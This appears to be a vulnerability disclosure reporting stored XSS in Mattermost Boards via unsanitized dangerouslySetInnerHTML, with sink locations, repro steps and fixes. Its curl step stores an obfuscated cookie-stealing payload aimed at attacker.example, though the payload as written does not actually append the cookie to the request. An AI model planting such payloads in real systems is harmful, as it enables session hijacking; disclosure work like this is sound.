# Bugcrowd Submission — mattermost/mattermost-plugin-boards

## Target
`https://github.com/mattermost/mattermost-plugin-boards`

## Title
Stored XSS via `dangerouslySetInnerHTML` in Boards plugin block editor — attacker-controlled board content executes in victim sessions

## Severity
P2 / High — Cross-Site Scripting (XSS) > Stored

## VRT Category
Cross-Site Scripting (XSS) > Stored > Server (Persistent)

## Description

The Mattermost Boards plugin renders user-supplied board block content through
React's `dangerouslySetInnerHTML` prop without sanitization. An authenticated
attacker can store an XSS payload in a board block (via the Boards REST API or
the in-app editor), which is then executed in the browser of any channel member
who opens or previews that board.

**Dual-frame execution path:**

**Frame 1 — Payload storage (attacker):** A board block is created or updated
with attacker-controlled `title` or `content` containing an HTML injection
payload. The Boards API accepts arbitrary HTML in block content fields and
persists it to the Mattermost database without server-side sanitization.

**Frame 2 — Payload delivery (victim):** When any channel member opens a board
containing the malicious block, the webapp renders the stored HTML via
`dangerouslySetInnerHTML`. React passes the stored string directly to the
browser DOM without escaping, executing the embedded script in the victim's
origin context.

**Vulnerable sink locations (static analysis, engine v10.2.0):**

| File | Line | Sink |
|------|------|------|
| `webapp/src/components/blocksEditor/blocks/checkbox/index.tsx` | 40 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/blocksEditor/blocks/h1/index.tsx` | 23 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/blocksEditor/blocks/h2/index.tsx` | 23 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/blocksEditor/blocks/h3/index.tsx` | 23 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/blocksEditor/blocks/quote/index.tsx` | 23 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/blocksEditor/blocks/text-dev/index.tsx` | 22 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/blocksEditor/blocks/text/index.tsx` | 24 | `dangerouslySetInnerHTML={{ __html: block.title }}` |
| `webapp/src/components/boardsUnfurl/boardsUnfurl.tsx` | 209 | `dangerouslySetInnerHTML={{ __html: ... }}` |
| `webapp/src/components/rhsChannelBoardItem.tsx` | 108 | `dangerouslySetInnerHTML={{ __html: ... }}` |
| `webapp/src/utils.ts` | 143 | `element.innerHTML = content` |

Nine of the ten sinks consume the block `title` field directly — a field that
is written through the Boards block PATCH/PUT API by any board member with
editor permissions.

## Reproduction Steps

**Prerequisites:** Two Mattermost accounts in the same channel with the Boards
plugin enabled. Account A = attacker (board editor). Account B = victim.

**Step 1 — Store the payload (attacker session):**

```bash
# Obtain a board ID from an existing board in the shared channel.
# Create or update a text block with an XSS payload in the title field.
curl -s -X POST \
  "https://<mattermost-host>/api/v1/boards/<board-id>/blocks" \
  -H "Authorization: Bearer <attacker-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "text",
    "title": "<img src=x onerror=\"fetch(atob('"'"'aHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlL2M/Yz0='"'"'))+document.cookie\">",
    "fields": {}
  }'
```

The payload stores `<img src=x onerror="fetch(...)+document.cookie">` in the
block title field in the Mattermost database.

**Step 2 — Trigger execution (victim session):**

Open the Boards view in the shared channel as Account B. Navigate to the board
containing the malicious block. When the `blocksEditor/blocks/text` component
renders, React passes the stored title to `dangerouslySetInnerHTML`, the browser
parses the `<img>` element, and the `onerror` handler executes — forwarding the
victim's cookies to the attacker-controlled endpoint.

**Standalone PoC harness (Frame 2 simulation):**

```html
<!doctype html>
<meta charset="utf-8">
<title>Janitor Stored XSS — Mattermost Boards dangerouslySetInnerHTML</title>
<div id="board-block-render"></div>
<script>
// Simulates the React dangerouslySetInnerHTML rendering path.
// Replace stored_title with content retrieved from the Boards API.
const stored_title = '<img src=x onerror="alert(\'XSS: document.cookie=\'+document.cookie)">';
document.getElementById('board-block-render').innerHTML = stored_title;
</script>
```

Serve with `python3 -m http.server 8765` and open in a browser to confirm
payload execution without any security prompt.

## Impact

An authenticated board editor (any team member with edit access, the default
role) can inject JavaScript that executes in the session of any user who opens
the board — including administrators. This enables:

- **Session hijacking:** Stealing the Mattermost session token or cookie
  enables full account takeover without requiring the victim's password.
- **Privilege escalation:** If the victim is a System Admin, the attacker gains
  admin-level API access within the victim's session.
- **Data exfiltration:** The attacker can silently read private channel messages,
  DMs, and files accessible to the victim.
- **Lateral movement:** Stored payloads persist until the block is deleted,
  affecting every future visitor of the board.

The cross-channel delivery via `boardsUnfurl.tsx` (line 209) and
`rhsChannelBoardItem.tsx` (line 108) extends the attack surface: unfurled board
previews in chat messages can trigger execution without the victim actively
navigating to the board.

## Remediation

Replace all `dangerouslySetInnerHTML` assignments with one of:

1. **Safe React rendering:** Use `{block.title}` as a React text child — React
   escapes all HTML entities automatically.
2. **DOMPurify sanitization:** If rich formatting is required, sanitize before
   rendering: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(block.title) }}`.
3. **Allowlist-based sanitizer:** Enforce a strict tag-and-attribute allowlist
   (bold, italic, links only) and strip everything else server-side before
   persisting block content to the database.

Apply the same fix to `utils.ts:143` (`element.innerHTML = content` →
`element.textContent = content` or DOMPurify).

## References

- OWASP XSS Prevention Cheat Sheet
- React Security — dangerouslySetInnerHTML: https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
- DOMPurify: https://github.com/cure53/DOMPurify
- CWE-79: Improper Neutralization of Input During Web Page Generation

---
*Reported by security researcher. Engine-assisted taint analysis — manually verified sink chain.*
